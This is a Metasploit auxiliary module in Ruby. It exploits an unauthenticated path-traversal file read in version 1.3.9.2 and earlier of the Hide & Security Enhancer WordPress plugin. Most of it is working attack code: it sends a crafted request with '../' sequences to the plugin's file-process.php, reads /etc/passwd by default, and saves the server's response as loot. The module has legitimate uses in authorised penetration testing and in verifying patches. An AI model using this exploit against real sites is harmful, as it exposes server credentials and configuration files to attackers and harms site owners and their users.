##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Hide & Security Enhancer Arbitrary File Read',
      'Description'    => %q{
    This module exploits an unauthenticated arbitrary file read in vulnerable
    Wordpress instances.

    This module exploits an unauthenticated arbitrary file read vulnerability
    in versions 1.3.9.2 and prior of the Hide & Security Enhancer Wordpress
    plugin.

    Categories: Open Source, Wordpress

    Price: 3

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new('FILEPATH', [true, 'The file path to read on the server', '/etc/passwd'])
      ], self.class)
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php'),
      'vars_get' => {
        'action' => 'style-clean',
        'file_path' => '/../../../../../../../../' + datastore['FILEPATH']
      }
    })

    path = store_loot("wordpress.file", "application/octet-stream", datastore['RHOST'], res.body, 'wp_hidesecurity')
    print_good("File saved to #{path}")
  end
end

